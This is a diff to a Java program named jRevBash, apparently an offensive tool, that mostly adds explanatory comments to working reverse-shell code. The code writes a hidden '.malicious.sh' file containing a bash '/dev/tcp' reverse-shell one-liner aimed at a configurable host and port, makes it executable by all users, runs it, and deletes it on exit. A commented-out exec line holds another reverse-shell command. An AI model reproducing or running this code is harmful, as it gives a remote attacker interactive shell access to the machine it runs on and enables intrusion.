@@ -4,15 +4,17 @@ import java.io.PrintWriter;
 
 
 public class jRevBash {
-	
+	//Declare host and ip	
 	static String host = "127.0.0.1"; //TODO CHANGE ME
 	static String port = "31337"; //TODO CHANGE ME
 	
 	private static boolean linBash() {
 		//TODO add support for multiple other shells
+		//Create runtime environment
 		Runtime r = Runtime.getRuntime();
 		Process p = null;
 
+		//Create a print writer that creates .malicious.sh with /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
 		try {
 			PrintWriter malicious = new PrintWriter(".malicious.sh", "UTF-8");
 			malicious.println("/bin/bash -i >& /dev/tcp/"+ host + "/" + port + "0>&1");
@@ -20,17 +22,20 @@ public class jRevBash {
 		} catch (IOException e1) {
 			e1.printStackTrace();
 		}
-
+		//TODO better variable names and malicious filename
+		//Open .malicious.sh and set it to delete on exit
 		File mal = new File(".malicious.sh");
 		mal.deleteOnExit();
 
+		//chmod 777
 		mal.setExecutable(true, false);
 		mal.setReadable(true, false);
 		mal.setWritable(true, false);
 
 		try {
+			//Execute .malicious.sh
 			p = r.exec("bash .malicious.sh".toString());
-			//TODO Investigate why the following crashes java as it is a much cleaner solution.
+			//TODO ISSUE #1: Investigate why the following crashes java as it is a much cleaner solution.
 			//p = r.exec("/bin/bash  -i > /dev/tcp/127.0.0.1/31337 0<&1 2>&1");
 		} catch (IOException e) {
 			e.printStackTrace();
@@ -46,8 +51,10 @@ public class jRevBash {
 	}
 
 	public static void main(String args[]){
+		//Get OS name
 		String OS = System.getProperty("os.name");
-		//TODO Test on OSX, BSD's, *nix
+		//TODO Test/create on OSX, BSD's, *nix
+		//If Linux then create bash reverse shell
 		if(OS.equals("Linux")){
 			linBash();
 		}
